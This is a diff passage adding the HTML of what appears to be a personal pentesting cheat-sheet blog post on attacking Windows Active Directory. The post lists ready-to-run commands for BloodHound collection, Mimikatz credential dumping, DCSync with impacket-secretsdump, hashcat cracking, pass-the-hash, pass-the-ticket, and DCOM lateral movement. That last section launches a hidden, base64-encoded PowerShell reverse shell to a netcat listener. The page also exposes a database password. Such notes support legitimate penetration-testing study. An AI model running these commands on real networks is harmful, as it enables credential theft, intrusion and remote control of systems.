+<li>All active sessions: `MATCH p = (c:Computer)-[:HasSession]-&gt;(m:User) RETURN p</li>
+<li>Matches: <code>MATCH (m:Computer) RETURN m</code></li>
+</ul>
+</li>
+</ul>
+<h2 id="process---sharphoundbloodhound">Process - SharpHound/BloodHound<a href="#process---sharphoundbloodhound" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<ul>
+<li>Import to Powershell: <code>Import-module .\Sharphound.ps1</code></li>
+<li>Start Sharphound: <code>Invoke-Bloodhound</code> (For Help: <code>Get-Help Invoke-Bloodhound</code>)
+<ul>
+<li>Start Collection: <code>Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\jeff\Desktop\ -OutputPrefix &quot;domain audit&quot;</code></li>
+<li>Copy Zip file to Kali
+<ul>
+<li>Impacket: <code>sudo impacket-smbserver share -smb2support /smbshare -user test -password 'test'</code></li>
+<li>Access Kali IP through Windows Explorer: <code>\\192.168.xx.xxx\</code></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Start Bloodhound:
+<ul>
+<li>Start neo4J: <code>sudo neo4j start</code></li>
+<li>Run `bloodhound</li>
+<li>Browse to <code>http://localhost:7474</code> and login</li>
+<li>Launch Bloodhound: <code>bloodhound</code> (<code>neo4j:':V&amp;+w.,N.hBq#5</code>)</li>
+<li>Upload .zip file from Sharphound Collection (drag and drop into Bloodhound)</li>
+</ul>
+</li>
+</ul>
+<h2 id="passing-ntlm-hashes-with-mimikatz">Passing NTLM Hashes with Mimikatz<a href="#passing-ntlm-hashes-with-mimikatz" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<ul>
+<li>Run Mimkatz as above to retrieve NTLM hash via <code>lsadump::sam</code></li>
+<li>Gain an interactive shell with <code>impacket-psexec</code> (hash format &ldquo;LMHash:NTHash&rdquo;):</li>
+</ul>
+<h1 id="dcsync">DCSync<a href="#dcsync" class="hanchor" ariaLabel="Anchor">#</a> </h1>
+<p>Requires credentials for member of <em>Domain Admins</em>, <em>Enterprise Admins</em>, or <em>Administrators</em></p>
+<ul>
+<li>Mimikatz (On Windows)
+<ul>
+<li><code>lsadump::dcsync /user:domain\targetuser</code> (eg. <code>lsadump::dcsync /user:corp\dave</code>)</li>
+<li>Save as <code>hashes.dcsync</code> and crack with Hashcat: <code>hashcat -m 1000 hashes.dcsync /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force</code></li>
+</ul>
+</li>
+<li>Impacket-secretsdump (On Kali)
+<ul>
+<li><code>impacket-secretsdump -just-dc-user targetuser domain.com/adminsuer:&quot;AdminUserPassword\!&quot;@192.168.dc.ip</code>
+(eg. <code>impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:&quot;BlahBlahBlah&quot;@192.168.50.162</code>)</li>
+</ul>
+</li>
+</ul>
+<h2 id="overpass-the-hash">Overpass The Hash<a href="#overpass-the-hash" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<p>Run <strong>any</strong> process as another (admin) user in Windows to cache their creds</p>
+<ul>
+<li>Windows: Shift right-click notepad, &ldquo;run as different user&rdquo;, enter target user&rsquo;s creds to cache</li>
+<li>Mimikatz: <code>privilege::debug</code> then <code>sekurlsa::logonpasswords</code> (Grab target user NTLM hash)</li>
+<li>Create new PowerShell session as user from cached creds: <code>sekurlsa::pth /user:tgtuser /domain:corp.com /ntlm:USERNTLMHASHF84D7A70E2EB3B9F05C425E /run:powershell</code></li>
+<li>Generate a TGT by authenticating to a network share: <code>net use \\files04</code></li>
+<li>Check generated ticket with: <code>klist</code></li>
+<li>Then run PsExec to launch cmd on targethost (files04): <code>.\PsExec.exe \\files04 cmd</code></li>
+</ul>
+<h2 id="pass-the-ticket">Pass The Ticket<a href="#pass-the-ticket" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<ul>
+<li>Export all TGT/TGS (Mimikatz): <code>privilege::debug</code> &amp; <code>sekurlsa::tickets /export</code></li>
+<li>Check the exported tickets (PowerShell): <code>dir *.kirbi</code></li>
+<li>Pick a ticket and inject it (Mimikatz): `kerberos::ptt [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi</li>
+<li>Check import (PowerShell): <code>klist</code></li>
+<li>Move to shared folder (PowerShell): <code>ls \\web04\</code></li>
+</ul>
+<h2 id="dcom">DCOM<a href="#dcom" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<p>Distributed Component Object Model (reqs Local Admin)</p>
+<ul>
+<li>Create variable for MMC2.0 applicationWith Admin(PowerShell): <code>$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID(&quot;MMC20.Application.1&quot;,&quot;192.168.target.ip&quot;))</code></li>
+<li>Start nc listener: <code>nc -nlvp 443</code></li>
+<li>Create a variable to pass an execute argument (use <code>encode.py</code> script):</li>
+</ul>
+<pre tabindex="0"><code>$dcom.Document.ActiveView.ExecuteShellCommand(&#34;powershell&#34;,$null,&#34;powershell -nop -w hidden -e BASE64ENCODEDREVERSESHELLJABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5AAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA&#34;,&#34;7&#34;)
+</code></pre>
+      </div></div>
+
+  
+    
+<div class="pagination">
+  <div class="pagination__title">
+    <span class="pagination__title-h">Read other posts</span>
+    <hr />
+  </div>
+  <div class="pagination__buttons">
+    
+      <a href="/posts/chatgpt---models--limits/" class="button inline prev">
+        &lt; [<span class="button__text">ChatGPT - Models &amp; Limits</span>]
+      </a>
+    
+    
+      ::
+    
+    
+      <a href="/posts/cheat-sheet---fabric/" class="button inline next">
+         [<span class="button__text">Cheat Sheet - Fabric</span>] &gt;
+      </a>
+    
+  </div>
+</div>
+
+
+  
+
+  
+    
+
+  
+</article>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright">
+        <span>© 2025 Powered by <a href="https://gohugo.io">Hugo</a></span>
+    
+      <span>:: <a href="https://github.com/panr/hugo-theme-terminal" target="_blank">Theme</a> made by <a href="https://github.com/panr" target="_blank">panr</a></span>
+      </div>
+  </div>
+</footer>
+
+
+
+
+
+
+<script type="text/javascript" src="/bundle.min.js"></script>
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
